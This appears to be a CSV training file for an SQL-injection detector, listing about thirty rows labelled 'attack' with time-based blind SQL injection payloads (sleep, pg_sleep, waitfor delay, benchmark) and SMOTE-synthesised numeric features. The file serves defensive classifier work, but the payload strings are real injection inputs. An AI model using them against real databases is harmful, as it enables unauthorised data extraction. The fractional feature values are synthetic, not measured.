id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000061,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",nearest_attack_euclidean,R000108,0.47559425564073654,118.35034374780264,28.802721283665008,3.380265774890849,25.704081925497512,20.408163850995024,55.73129476214759,16.50680320916252,0.21878390139516177,0.17255918718587632,0.4691319212738141,0.13952499014514777,0.0,3.901360641832504,0.0,0.0,0.0,1.901360641832504,0.0,9.605442567330016,0.09863935816749601,0.0,1.0,1.901360641832504,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.09863935816749603,0.0,2.7755575615628914e-17,0.0,1.0,0.901360641832504,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000062,attack,time,"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",nearest_attack_euclidean,R000043,0.39403263539601363,161.306673658762,29.960381351929257,3.8014683654200514,69.50476689911572,17.84152540771703,56.98019067596462,16.98019067596463,0.4305582327959272,0.11046986440130468,0.3536167245531659,0.1053551782496022,1.0198093240353712,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,10.0,0.0,1.9603813519292579,0.9801906759646288,2.0396186480707423,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0198093240353714,0.0,0.019809324035371167,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.9801906759646289,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9801906759646287,0.9801906759646287,6.980190675964629
SMOTE_000063,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",nearest_attack_euclidean,R000268,0.016961893903626145,59.95602249785233,21.032983126610752,3.727341625221054,27.0,3.0109943755369173,19.945028122315414,10.0,0.4503533906422581,0.05023559376150538,0.33261346350651133,0.1667975520897252,2.0,3.0109943755369177,0.0,0.0,0.0,0.0,0.0,2.9890056244630823,0.0,0.0,0.0,2.220446049250313e-16,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000064,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.010675048840478736,26.99010225280069,17.0,3.902784214928023,12.99010225280069,4.009897747199309,3.0,6.990102252800692,0.4812840905116947,0.14858522815267602,0.11115340917606542,0.25897727215956384,2.990102252800691,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000065,attack,time,1 where 7224  =  7224 and sleep  (  5  )  #,nearest_attack_euclidean,R000196,0.6717003626365499,43.735536538009036,19.632231730995482,3.4666371994589893,13.735536538009036,10.0,16.0,4.0,0.31372924865130286,0.22875691711623236,0.3660110673859718,0.09150276684649294,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,1.9999999999999996,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.6322317309954817,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.632231730995482
SMOTE_000066,attack,time,select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,nearest_attack_euclidean,R000173,0.24995958542813193,52.23845250722186,18.714419690208196,3.5097567470376023,27.809613126805466,1.0,16.61922625361093,6.8096131268054645,0.5330116668840577,0.019187231653156472,0.3177212992950137,0.13007980216777215,3.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.9048065634027322,0.0,0.9048065634027322,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0951934365972677,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0951934365972678
SMOTE_000067,attack,time,"select sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000202,0.853884295595773,46.552578667453275,16.65036838106475,3.051655142075824,16.601473524259013,1.0,20.951105143194262,8.0,0.3526895351507367,0.021873903627783464,0.45044533219921207,0.17499122902226777,0.0,3.0,0.0,0.0,0.0,1.0,0.0,3.3251841905323767,0.6748158094676232,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000068,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'mabd'  =  'mabd,nearest_attack_euclidean,R000197,0.7460784975000053,99.05883155727297,25.77451314886374,3.332182433748229,37.81373418704572,1.7549026297727472,45.245097370227256,14.245097370227253,0.3796937683257594,0.017525316462121396,0.4583172670681804,0.1444636481439388,3.7549026297727472,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,8.245097370227253,0.2450973702272524,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000069,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.9984126825134753,32.58417468334837,16.0,3.179111392783348,11.0,0.0,13.29208734167419,8.29208734167419,0.3378438221352646,0.0,0.4078607757812915,0.2542954020834439,0.7079126583258112,0.5841746833483774,0.0,0.0,0.0,1.0,0.0,1.9999999999999996,0.0,4.0,0.0,1.0,0.7079126583258112,0.2920873416741888,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000070,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,1.780670789621051,76.70847001008872,27.552768665994087,3.735586805285287,19.1306193380414,18.316611995964514,28.919544674065055,10.341694002017743,0.24736266109268545,0.24475377638750473,0.3736747641920042,0.13420879832780563,0.0,1.8944626680118284,0.0,0.0,0.0,1.0,0.0,4.894462668011828,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.5527686659940858,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.44723133400591425,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.447231334005914
SMOTE_000071,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",nearest_attack_euclidean,R000269,1.2654573759588428,83.05991299710175,27.980029000966084,3.8680801372664217,28.280077335909564,17.719922664090436,28.399903330113045,8.660009666988696,0.3436164162868836,0.2116144828891445,0.3399570844777388,0.10481201634623313,1.980029000966086,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.679980666022609,0.0,0.0,1.0,1.0,0.6600096669886955,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000072,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000172,1.1040906273915105,64.28287919562977,28.0,4.310412671773714,28.710505594173025,10.075681206555346,14.641439597814884,10.855252797086512,0.4453931709571881,0.15904609286069232,0.22738679225293787,0.16817394392918164,3.2138131992716277,1.1102230246251565e-16,2.0,0.0,0.0,0.7861868007283718,0.0,1.2138131992716286,0.0,0.21381319927162823,0.2138131992716282,4.0,1.0,0.0,1.0,0.0,0.0,0.7861868007283718,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.7861868007283718,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.786186800728372
SMOTE_000073,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,1.038738355148357,82.97466254955286,26.184797529731714,3.527084735672098,28.067061314418716,10.0,34.907601235134145,10.0,0.33515576368640115,0.12090779903679183,0.42302863824001513,0.12090779903679183,0.6974662549552858,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,5.302533745044714,0.0,1.0,0.0,3.0,0.6974662549552857,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000074,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.6680692733847281,44.14940740329343,16.716469134431144,3.0736412661402097,13.0,0.0,19.432938268862287,11.716469134431142,0.2947395257974526,0.0,0.43994395451478,0.26531651968776737,0.0,0.7164691344311424,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,0.0,2.0,0.0,0.7164691344311424,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000075,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,0.8003466507049652,64.37278013775835,19.372780137758355,2.8937488573429118,10.000000000000002,10.0,34.0,10.372780137758353,0.15535389389961934,0.15535389389961934,0.5282032392587057,0.16108897294205554,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,6.0,0.37278013775835306,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000076,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.087726476677245,33.0,17.0,3.504123773197531,13.0,0.4474117371266173,10.0,9.552588262873382,0.3939393939393939,0.013557931428079317,0.30303030303030304,0.2894723716022237,0.0,0.5525882628733826,2.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,5.0,0.0,2.0,0.0,0.5525882628733825,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000077,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000156,1.2616741405484673,27.316171079728633,19.05293686378291,4.1012315666454935,13.052936863782909,3.4735315681085464,2.736765784054274,8.052936863782907,0.475908567619866,0.13033143480385564,0.10199428926330673,0.29176570831297166,2.7367657840542727,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0529368637829082,0.2632342159457271,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000078,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,0.18112416201132667,70.91545691063126,23.91545691063127,3.4358019885556343,19.0,10.0,31.0,10.91545691063127,0.2679288367601621,0.1410151772421906,0.43714704945079086,0.15390893654685636,0.0,1.0,2.0,0.0,0.0,1.0,0.0,5.0,0.9154569106312702,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000079,attack,time,select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,nearest_attack_euclidean,R000167,0.3868230859485237,50.04502967376315,18.39099406524737,3.498306763041417,24.0,1.0,17.436023739010523,7.609005934752631,0.4807362061496253,0.020030675256234393,0.3473067392091028,0.15192637938503747,3.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.609005934752631,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000080,attack,time,"1""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000223,1.9372094577516044,49.34398314920665,20.3731754793651,3.563037237522925,17.59763219047646,3.6268245206349032,18.119526438095292,10.0,0.3428567389147318,0.07696803170173419,0.3722061718223195,0.2079690575612145,2.0,1.7463509587301949,1.2536490412698051,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,1.2536490412698054,1.0,1.0,0.6268245206349026,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.3731754793650973,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.373175479365097
SMOTE_000081,attack,time,"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000231,0.366216340912379,74.25787356814948,24.0,3.5248472735035583,17.0,19.0,29.0482279734579,9.20964559469158,0.2294304833749329,0.2564223049484544,0.39021759583468835,0.12392961584192425,0.8951772026542097,0.10482279734579025,0.0,0.0,0.0,1.0,0.0,5.2096455946915805,0.0,0.0,1.0,1.0,0.8951772026542097,0.10482279734579025,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000082,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,0.09015241697208552,85.8793809509151,27.84922618864389,3.6696844794784025,31.607988090474112,10.0,34.21108333589856,10.060309524542445,0.36785972565959874,0.11645011209456167,0.39850456814466273,0.11718559410117685,1.0,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,5.060309524542444,0.0,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000083,attack,time,1 where 7224  =  7224 and sleep  (  5  )  #,nearest_attack_euclidean,R000196,0.6763574431349867,43.740636211997014,19.629681894001497,3.46659463483983,13.74063621199701,10.0,16.0,4.0,0.3138083133642947,0.22873056221190174,0.3659688995390428,0.0914922248847607,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,1.9999999999999996,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.6296818940014949,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6296818940014948
SMOTE_000084,attack,time,"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000247,0.6978822976853232,103.67810082667759,29.408677869630843,3.8040307213073663,32.40867786963084,16.423140985682252,38.63471147852338,16.211570492841126,0.3151900380968227,0.1566252576145859,0.37171418855060046,0.156470515737991,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.8028926232102813,0.0,5.605785246420563,0.0,0.0,0.8028926232102813,5.8028926232102815,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000085,attack,time,1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000307,1.205489941951867,55.33729933274762,21.728354363476623,3.553780200777981,17.18506309042987,10.0,21.15223624231775,7.0,0.30544914946873886,0.18252619274575638,0.3842563228634753,0.12776833492202946,1.0,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.42388187884112544,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4238818788411254
SMOTE_000086,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,0.9503154932417056,81.38425106383745,20.730708510639577,3.0720060707585524,30.192125531918727,2.0,39.461417021279146,9.730708510639575,0.3708394048146289,0.024602018130546868,0.4850457784717057,0.11951279858311847,0.0,1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.7307085106395754,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,0.26929148936042463,0.7307085106395754,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000087,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.1652969420567512,36.91950935535339,16.0,3.048310638845551,11.0,0.0,16.595119426980794,9.324389928372598,0.3015631991047283,0.0,0.44415932253242096,0.25427747836285075,0.3243899283725993,1.3512201432548019,0.0,0.0,0.0,1.0,0.0,2.648779856745198,0.0,4.0,0.0,1.0,0.32438992837259917,0.6756100716274009,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000088,attack,time,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'acdu'  =  'acdu",nearest_attack_euclidean,R000162,1.5922829341095734,105.38440716704312,19.59610179176078,2.7810138084048472,18.768814334086258,13.231185665913744,58.0,15.384407167043129,0.17746177080775613,0.12629460072428447,0.5505584234018236,0.1456852050661357,2.384407167043128,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,1.0,2.0,0.596101791760782,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000089,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",nearest_attack_euclidean,R000108,0.9222348529646155,117.51987252515806,29.0,3.460453261513651,26.81456863178944,21.20364215794736,53.519872525158064,15.981789210263198,0.23080825306755753,0.18187926395420154,0.4519075280008292,0.1354049549774117,0.0,3.9999999999999996,0.0,0.0,0.0,1.7963578420526396,0.0,9.185431368210557,0.0,0.0,1.0,1.7963578420526394,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.2036421579473604,0.7963578420526396,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000090,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.41759261437196643,34.835750061270474,17.0,3.439891194941401,13.0,0.0,11.468600049016384,10.367150012254097,0.3749084921877861,0.0,0.327038517547716,0.2980529902644979,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.367150012254096,0.0,5.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000091,attack,time,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000171,1.4131785143663402,60.197155461053605,20.0,3.061223117822319,10.000000000000002,10.0,29.997629550878003,10.1995259101756,0.16778764742800115,0.16778764742800117,0.4949615776868644,0.16946312745713335,0.5997629550878004,0.4002370449121996,0.0,0.0,0.0,1.0,0.0,5.199525910175601,1.0,0.0,1.0,1.0,0.5997629550878004,0.40023704491219964,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
